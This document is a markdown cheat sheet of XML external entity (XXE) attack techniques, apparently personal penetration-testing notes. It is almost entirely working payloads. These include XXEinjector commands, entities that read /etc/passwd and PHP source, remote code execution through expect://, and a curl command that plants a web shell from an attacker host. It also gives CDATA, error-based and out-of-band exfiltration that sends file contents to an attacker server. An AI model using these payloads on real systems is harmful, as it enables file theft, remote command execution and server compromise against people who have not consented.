# XXE

## Tips
- Check if there are requests sending XML to the backend, ideally where the backend doesn't sanitise
- Check if some fields from the xml are displayed on the page to inject into
- Check if changing the content-type to `application/xml` works ([json2xml](https://www.convertjson.com/json-to-xml.htm))

## XXEinjector
- [XXEinjector](https://github.com/enjoiz/XXEinjector)

Copy a XML request from BURP and replace all of the xml except the top line with `XXEINJECT`

```
...
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```
ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=/req.txt --path=/etc/passwd --oob=http --phpfilter
```

### Detection
Check if you can read a variable from a DDT definition
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe "vulnerable">
]>
&xxe;
```

### Basic file read
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### Read PHP files
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### RCE
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "expect://id">
]>
```
#### Inject a webshell
```xml
<!DOCTYPE somefield [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'<ip>/shelle.php'">
]>
```

#### CDATA exfiltration
Host this snippet in a file on a http server
```xml
<!ENTITY joined "%begin;%file;%end;">
```
```xml
<!DOCTYPE somefield [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://<attacker-ip>:1337/joined.dtd">
  %xxe;
]>
```
```xml
<somefield>&joined;</somefield>
```

#### Error based
 - Check if sending malformed data triggers useful error messages

Host a DTD file containing something like this
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%whatever;/%file;'>">
```

Then reference it
```xml
<!DOCTYPE somefield [ 
  <!ENTITY % xxe SYSTEM "http://<attacker-ip>:1337/error.dtd">
  %xxe;
  %error;
]>
```

#### Out of band blind exfiltration
See also DNS OOB Exfiltration.

Host a DTD file containing something like this
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % xxe "<!ENTITY content SYSTEM 'http://<attacker-ip>:1337/?content=%file;'>">
```
Inject this
```xml
<!DOCTYPE somefield [ 
  <!ENTITY % oob SYSTEM "http://<attacker-ip>:1337/oob.dtd">
  %oob;
  %xxe;
]>
```
Don't forget to reference the `content` field in the xml